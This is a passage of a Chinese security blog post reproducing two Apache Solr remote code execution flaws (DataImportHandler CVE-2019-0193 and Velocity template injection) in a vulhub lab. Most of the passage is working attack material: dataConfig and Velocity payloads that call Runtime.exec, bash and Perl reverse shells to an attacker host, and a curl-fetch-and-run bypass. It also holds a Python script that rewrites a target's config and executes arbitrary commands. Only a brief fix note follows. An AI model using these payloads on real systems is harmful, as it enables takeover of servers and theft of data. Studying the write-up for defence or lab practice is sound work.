+<p>触发的方式不止一种，看到可以利用的大致有两种，下面复现的这种方式缺点时不回显，优点时支持低版本检测；还有一种可以回显的方式，但是低版本会失败，所以没有复现，详情可以看 <a href="https://github.com/1135/solr_exploit" target="_blank" rel="noopener">https://github.com/1135/solr_exploit</a> </p>
+</blockquote>
+<h4 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h4><p>打开刚刚创建好的<code>test</code>核心，选择Dataimport功能并选择debug模式，填入以下POC： exec中的命令可以自己替换</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">"URLDataSource"</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(<span class="string">"touch /tmp/success"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;document&gt;</span></span><br><span class="line"><span class="regexp">    &lt;entity name="stackoverflow"</span></span><br><span class="line"><span class="regexp">            url="https:/</span><span class="regexp">/stackoverflow.com/feeds</span><span class="regexp">/tag/solr</span><span class="string">"</span></span><br><span class="line"><span class="string">            processor="</span>XPathEntityProcessor<span class="string">"</span></span><br><span class="line"><span class="string">            forEach="</span>/feed<span class="string">"</span></span><br><span class="line"><span class="string">            transformer="</span>script:poc<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">  &lt;/document&gt;</span></span><br><span class="line"><span class="string">&lt;/dataConfig&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573821786.72.png" alt></p>
+<h4 id="反弹shell-反弹时可能会等几秒"><a href="#反弹shell-反弹时可能会等几秒" class="headerlink" title="反弹shell(反弹时可能会等几秒)"></a>反弹shell(反弹时可能会等几秒)</h4><p>选用的两种反弹方式以及语法和Apache Solr Velocity模版注入远程命令执行漏洞类似</p>
+<h5 id="bash反弹shell-经过base64编码后即可反弹"><a href="#bash反弹shell-经过base64编码后即可反弹" class="headerlink" title="bash反弹shell(经过base64编码后即可反弹)"></a>bash反弹shell(经过base64编码后即可反弹)</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.1.102/</span><span class="number">9999</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>     </span><br><span class="line"></span><br><span class="line"><span class="comment">#base64编码</span></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">"URLDataSource"</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(<span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; "</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;document&gt;</span></span><br><span class="line"><span class="regexp">    &lt;entity name="stackoverflow"</span></span><br><span class="line"><span class="regexp">            url="https:/</span><span class="regexp">/stackoverflow.com/feeds</span><span class="regexp">/tag/solr</span><span class="string">"</span></span><br><span class="line"><span class="string">            processor="</span>XPathEntityProcessor<span class="string">"</span></span><br><span class="line"><span class="string">            forEach="</span>/feed<span class="string">"</span></span><br><span class="line"><span class="string">            transformer="</span>script:poc<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">  &lt;/document&gt;</span></span><br><span class="line"><span class="string">&lt;/dataConfig&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573822375.37.png" alt></p>
+<h5 id="perl反弹-远程加载反弹，-绕过后台函数不允许直接传管道符的限制"><a href="#perl反弹-远程加载反弹，-绕过后台函数不允许直接传管道符的限制" class="headerlink" title="perl反弹(远程加载反弹，$@绕过后台函数不允许直接传管道符的限制)"></a>perl反弹(远程加载反弹，$@绕过后台函数不允许直接传管道符的限制)</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c $@|perl foo curl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.102</span>:<span class="number">8000</span>/solr.pl</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573822566.61.png" alt></p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
+<p><a href="https://github.com/1135/solr_exploit" target="_blank" rel="noopener">https://github.com/1135/solr_exploit</a> </p>
+<h2 id="Apache-Solr-Velocity模版注入远程命令执行漏洞"><a href="#Apache-Solr-Velocity模版注入远程命令执行漏洞" class="headerlink" title="Apache Solr Velocity模版注入远程命令执行漏洞"></a>Apache Solr Velocity模版注入远程命令执行漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr中是默认集成了VelocityResponseWriter这个插件，插件的初始化过程中params.resource.loader.enabled，程序默认设置是false。攻击者在可以访问Solr控制台时，可以通过发送/节点名称/config的POST请求的方式对该项配置进行更改，当该配置被更改为true时用户将被允许通过设置请求中的参数来指定加载相关的资源，攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h3><p>Apache Solr 5.x - 8.2.0，存在config API版本</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击。</p>
+<p>漏洞环境： CVE-2019-0193 (vulhub环境)</p>
+<p>创建名为test的Core：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br><span class="line">sudo docker-compose <span class="built_in">exec</span> solr bash bin/solr create_core -c <span class="built_in">test</span> -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572343.97.png" alt></p>
+<p>搭建好后默认端口为8983，访问<a href="http://ip:8983" target="_blank" rel="noopener">http://ip:8983</a> 即可查看core名<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572408.89.png" alt></p>
+<p>查看是否有配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8983/solr/test/config</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572546.45.png" alt></p>
+<p>直接构造POST请求，在<strong>/solr/test/config</strong>目录POST以下数据（修改Core的配置）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572814.96.png" alt></p>
+<p>执行EXP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/solr/<span class="built_in">test</span>/select?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%27id%27))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#test换成对应的core名即可</span></span><br><span class="line"> </span><br><span class="line">192.168.1.103:8983/solr/<span class="built_in">test</span>/select?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%27id%27))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573572941.76.png" alt></p>
+<p><strong>反弹shell</strong></p>
+<p><strong>通过bash反弹shell</strong></p>
+<blockquote>
+<p>在java.lang.Runtime.exec()执行命令时，直接调用bash反弹shell会出问题， ，直接反弹不会生效，需要经过base64编码过后再进行部分URL编码，类似与activemq中的反序列化漏洞，需要经过base64编码才可以反弹</p>
+</blockquote>
+<p>常规使用bash反弹shell命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>经过URL编码： <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796814.7.png" alt></p>
+<p>然后经过URL编码： <a href="https://tool.leavesongs.com/" target="_blank" rel="noopener">https://tool.leavesongs.com/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C<span class="_">-d</span>%7D%7C%7Bbash%2C-i%7D</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796877.68.png" alt></p>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:8983/solr/<span class="built_in">test</span>/select?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzk5OTkgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C<span class="_">-d</span>%7D%7C%7Bbash%2C-i%7D%27))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573796959.18.png" alt></p>
+<p><strong>使用perl反弹shell</strong></p>
+<p>常用的perl反弹shell(在这里不行，编码过后也不行)</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<p>通过在远程公网服务器上写好pl脚本然后通过远程加载的方式调用(这里有个坑时管道符)</p>
+<p>pl脚本如下</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;$i=<span class="string">"192.168.1.102"</span>;$p=<span class="number">9999</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));<span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);<span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);&#125;;</span><br></pre></td></tr></table></figure>
+<p>正常情况下使用如下语句即可反弹,但是这里不行，受到管道符的影响，emm bash反弹的时候编码可以，这里不行</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.102</span>:<span class="number">8000</span>/solr.pl | perl</span><br></pre></td></tr></table></figure>
+<p>使用如下语句绕过限制反弹，不用编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="variable">$@</span>|perl foo curl http://192.168.1.102:8000/solr.pl</span><br></pre></td></tr></table></figure>
+<p>参考下面</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798112.15.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798131.81.png" alt></p>
+<p>进行反弹</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.103</span>:<span class="number">8983</span>/solr/test/<span class="keyword">select</span>?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27/bin/bash -c $@|perl foo curl http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.102</span>:<span class="number">8000</span>/solr.pl%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[<span class="number">1</span>..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573798261.44.png" alt></p>
+<p><strong>脚本检测</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_name</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[-] Get core name."</span>)</span><br><span class="line">    url += <span class="string">"/solr/admin/cores?wt=json&amp;indexInfo=false"</span></span><br><span class="line">    conn = requests.request(<span class="string">"GET"</span>, url=url)</span><br><span class="line">    name = <span class="string">"test"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = list(json.loads(conn.text)[<span class="string">"status"</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_config</span><span class="params">(url, name)</span>:</span></span><br><span class="line"> </span><br><span class="line">    url += <span class="string">"/solr/"</span>+name+<span class="string">"/config"</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[-] Update config."</span>, url)</span><br><span class="line">    headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">               <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>&#125;</span><br><span class="line">    post_data = <span class="string">"""</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      "update-queryresponsewriter": &#123;</span></span><br><span class="line"><span class="string">        "startup": "lazy",</span></span><br><span class="line"><span class="string">        "name": "velocity",</span></span><br><span class="line"><span class="string">        "class": "solr.VelocityResponseWriter",</span></span><br><span class="line"><span class="string">        "template.base.dir": "",</span></span><br><span class="line"><span class="string">        "solr.resource.loader.enabled": "true",</span></span><br><span class="line"><span class="string">        "params.resource.loader.enabled": "true"</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    conn = requests.request(<span class="string">"POST"</span>, url, data=post_data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> conn.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"update config error: "</span>, conn.status_code)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url,commond)</span>:</span></span><br><span class="line">    core_name = get_name(url)</span><br><span class="line">    update_config(url, core_name)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[-] Start get ."</span>)</span><br><span class="line">    url += <span class="string">"/solr/"</span>+core_name+<span class="string">"/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"</span> + commond + <span class="string">"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"</span></span><br><span class="line">    conn = requests.request(<span class="string">"GET"</span>, url)</span><br><span class="line">    <span class="keyword">print</span> (conn.text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># print sys.argv[0], "http://127.0.0.1"</span></span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    commond = sys.argv[<span class="number">2</span>]</span><br><span class="line">    exp(target,commond)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573801748.0.png" alt></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a><strong>修复建议</strong></h3><p>升级安全补丁；临时修复：使用白名单，确保网络设置只允许可信的流量与Solr进行通信。</p>
+<h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/102843715</a></p>
+<p><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247491786&amp;idx=1&amp;sn=b99cc014eaa5c7eb7e0f26a197ed4b3b&amp;chksm=ec1dd0e2db6a59f422ff58467ef81e5dd5260c3603e4900c28e429dc859e695ce28db1f43cc5&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1573558939901&amp;sharer_shareid=b4f68ebe4eb5286506b3d3b1a76fd4c7#rd" target="_blank" rel="noopener">Apache Solr Velocity RCE 真的 getshell 了吗</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Demos
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.lsowl.top/2019/11/15/Apache-Solr系列漏洞复现/" title="Apache Solr系列漏洞复现">https://www.lsowl.top/2019/11/15/Apache-Solr系列漏洞复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+            <a href="/tags/Apache-Solr/" rel="tag"><i class="fa fa-tag"></i> Apache Solr</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/09/CRLF漏洞/" rel="next" title="CRLF漏洞">
+                <i class="fa fa-chevron-left"></i> CRLF漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Demos">
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
